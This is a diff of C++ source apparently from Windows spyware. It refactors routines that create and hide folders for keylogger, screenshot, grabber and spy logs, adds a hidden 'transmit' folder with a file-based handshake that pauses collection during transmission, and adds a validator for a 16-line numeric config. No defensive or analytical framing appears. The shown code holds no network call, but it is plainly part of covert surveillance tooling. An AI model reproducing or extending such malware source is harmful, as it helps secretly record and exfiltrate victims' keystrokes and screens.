@@ -100,20 +100,133 @@ string GetSymbolic(int val)
 
 void MakeDataString(string &str)
 {
-	str = "ScreenshooterLog//ScreenShoot" + GetSymbolic(GetCurrentDataAndTime()->tm_mday) + "." +
+	str = schname + GetSymbolic(GetCurrentDataAndTime()->tm_mday) + "." +
 		GetSymbolic(GetCurrentDataAndTime()->tm_mon + 1) + "." + GetSymbolic(GetCurrentDataAndTime()->tm_year - 100) +
 		"+" + GetSymbolic(GetCurrentDataAndTime()->tm_hour) + "-" + GetSymbolic(GetCurrentDataAndTime()->tm_min) +
 		"-" + GetSymbolic(GetCurrentDataAndTime()->tm_sec) + ".png";
 }
 void CreateHiddenFolders(void)
 {
-	_mkdir("GrabberLog");
-	_mkdir("KeyloggerLog");
-	_mkdir("ScreenshooterLog");
-	_mkdir("SpyLog");
+	_mkdir(gfolder);
+	_mkdir(klfolder);
+	_mkdir(schfolder);
+	_mkdir(spyfolder);
+	_mkdir(transmit);
 
-	HideFile("GrabberLog");
-	HideFile("KeyloggerLog");
-	HideFile("ScreenshooterLog");
-	HideFile("SpyLog");
+	HideFile(gfolder);
+	HideFile(klfolder);
+	HideFile(schfolder);
+	HideFile(spyfolder);
+	HideFile(transmit);
+}
+void StopWhileTransmit(void)
+{
+	FILE *fp, *cp;
+	ifstream ifst;
+	ofstream ofst;
+
+	fp = fopen(request, "r");
+	if (fp == NULL)
+		return;
+
+	ofst.open(confirm, ios::out);
+	ofst.close();
+
+	do {
+		Sleep(1);
+		cp = fopen(finish, "r");
+	} while (cp == NULL);
+
+	fclose(cp);
+
+	DeleteFileA(finish);
+
+	fclose(fp);
+
+	DeleteFileA(request);
+}
+bool Checkconfig(char *filename)
+{
+	ifstream ifst;
+	int count = 0, val = 0;
+	bool bad = true, nan = false;
+	string str;
+	string::iterator sit;
+
+	char digits[] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
+
+	ifst.open(filename, ios::in);
+
+	while (!ifst.eof())
+	{
+		bad = true;
+		str.clear();
+		getline(ifst, str);
+		count++;
+
+		for (sit = str.begin(); sit < str.end(); sit++)
+		{
+			bad = true;
+			for (int i = 0; i < 10; i++)
+			{
+				if (*sit == digits[i])
+					bad = false;
+			}
+		}
+		if (str.length() == 0)
+			bad = true;
+	}
+	if (count != 16)
+		bad = true;
+
+	if (bad)
+	{
+		ifst.close();
+		return false;
+	}
+
+	ifst.clear();
+	ifst.seekg(ios::beg);
+
+	count = 0;
+
+	while (ifst)
+	{
+		count++;
+		ifst >> val;
+	}
+
+	if (count - 1 != 16)
+		bad = true;
+
+	if (bad)
+	{
+		ifst.close();
+		return false;
+	}
+
+	ifst.clear();
+	ifst.seekg(ios::beg);
+
+	count = 0;
+	str.clear();
+
+	while (!ifst.eof())
+	{
+		getline(ifst, str);
+		count++;
+
+		if (count == 1 || (count >= 8 && count <= 15))
+			if (str.length() != 1)
+				bad = true;
+	}
+
+	if (bad)
+	{
+		ifst.close();
+		return false;
+	}
+
+	ifst.close();
+	return true;
 }
